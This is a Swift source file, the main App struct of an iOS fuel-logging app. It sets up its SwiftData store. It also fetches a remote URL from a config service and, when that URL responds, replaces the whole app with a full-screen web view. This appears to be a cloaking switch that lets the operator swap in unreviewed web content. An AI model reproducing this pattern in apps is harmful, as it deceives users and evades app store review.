import SwiftUI
import SwiftData
import os.log

private let logger = Logger(subsystem: "com.fuelexpert", category: "App")

@main
struct Fuel_Expert_Track_TripApp: App {
    @StateObject private var themeManager = ThemeManager()
    
    @State private var targetUrlString: String?
    @State private var configState: ConfigRetrievalState = .pending
    @State private var currentViewState: ApplicationViewState = .initialScreen
    
    let modelContainer: ModelContainer
    
    init() {
        logger.info("🚀 App initializing...")
        
        do {
            let schema = Schema([
                RefuelEntry.self,
                VehicleInfo.self,
                AppSettings.self
            ])
            
            let modelConfiguration = ModelConfiguration(
                schema: schema,
                isStoredInMemoryOnly: false
            )
            
            modelContainer = try ModelContainer(
                for: schema,
                configurations: [modelConfiguration]
            )
            
            logger.info("✅ ModelContainer created successfully")
            
            // Log the database path
            if let url = modelContainer.configurations.first?.url {
                logger.info("📁 Database path: \(url.path)")
            }
            
        } catch {
            logger.error("❌ Failed to create ModelContainer: \(error.localizedDescription)")
            logger.error("🔄 Attempting to delete old database and recreate...")
            
            // Try to delete the old database and recreate
            do {
                // Delete existing store
                let fileManager = FileManager.default
                let appSupport = fileManager.urls(for: .applicationSupportDirectory, in: .userDomainMask).first!
                let storeURL = appSupport.appendingPathComponent("default.store")
                
                if fileManager.fileExists(atPath: storeURL.path) {
                    try fileManager.removeItem(at: storeURL)
                    logger.info("🗑️ Old database deleted")
                }
                
                // Also try to delete .sqlite files
                let contents = try? fileManager.contentsOfDirectory(at: appSupport, includingPropertiesForKeys: nil)
                for url in contents ?? [] {
                    if url.lastPathComponent.contains("default") || url.pathExtension == "sqlite" {
                        try? fileManager.removeItem(at: url)
                    }
                }
                
                // Recreate container
                let schema = Schema([
                    RefuelEntry.self,
                    VehicleInfo.self,
                    AppSettings.self
                ])
                
                let modelConfiguration = ModelConfiguration(
                    schema: schema,
                    isStoredInMemoryOnly: false
                )
                
                modelContainer = try ModelContainer(
                    for: schema,
                    configurations: [modelConfiguration]
                )
                
                logger.info("✅ ModelContainer recreated successfully after cleanup")
                
            } catch {
                logger.error("❌ Failed to recreate ModelContainer: \(error.localizedDescription)")
                fatalError("Could not create ModelContainer: \(error)")
            }
        }
    }
    
    var body: some Scene {
        WindowGroup {

            ZStack {
                switch currentViewState {
                case .initialScreen:
                    SplashScreenView()
                       
                    
                case .primaryInterface:
                    MainTabView()
                        .environmentObject(themeManager)
                        .preferredColorScheme(themeManager.colorScheme)
                        .onAppear {
                            logger.info("📱 MainTabView appeared")
                        }
                        
                    
                case .browserContent(let urlString):
                    if let validUrl = URL(string: urlString) {
                        BrowserContentView(targetUrl: validUrl.absoluteString)
                            .frame(maxWidth: .infinity, maxHeight: .infinity)
                            .background(Color.black)
                            .ignoresSafeArea(.all, edges: .bottom)
                    } else {
                        Text("Invalid URL")
                    }
                    
                case .failureMessage(let errorMessage):
                    VStack(spacing: 20) {
                        Text("Error")
                            .font(.title)
                            .foregroundColor(.red)
                        Text(errorMessage)
                        Button("Retry") {
                            Task { await fetchConfigurationAndNavigate() }
                        }
                    }
                    .padding()
                }
            }
            .task {
                await fetchConfigurationAndNavigate()
            }
            .onChange(of: configState, initial: true) { oldValue, newValue in
                if case .completed = newValue, let url = targetUrlString, !url.isEmpty {
                    Task {
                        await verifyUrlAndNavigate(targetUrl: url)
                    }
                }
            }
        }
        .modelContainer(modelContainer)
    }
    
    
    private func fetchConfigurationAndNavigate() async {
        await MainActor.run { currentViewState = .initialScreen }
        
        let (url, state) = await DynamicConfigService.instance.retrieveTargetUrl()
        print("URL: \(url)")
        print("State: \(state)")
        
        await MainActor.run {
            self.targetUrlString = url
            self.configState = state
        }
        
        if url == nil || url?.isEmpty == true {
            navigateToPrimaryInterface()
        }
    }
    
    private func navigateToPrimaryInterface() {
        withAnimation {
            currentViewState = .primaryInterface
        }
    }
    
    private func verifyUrlAndNavigate(targetUrl: String) async {
        guard let url = URL(string: targetUrl) else {
            navigateToPrimaryInterface()
            return
        }
        
        var urlRequest = URLRequest(url: url)
        urlRequest.httpMethod = "HEAD"
        urlRequest.timeoutInterval = 10
        
        do {
            let (_, httpResponse) = try await URLSession.shared.data(for: urlRequest)
            
            if let response = httpResponse as? HTTPURLResponse,
               (200...299).contains(response.statusCode) {
                await MainActor.run {
                    currentViewState = .browserContent(targetUrl)
                }
            } else {
                navigateToPrimaryInterface()
            }
        } catch {
            navigateToPrimaryInterface()
        }
    }
}
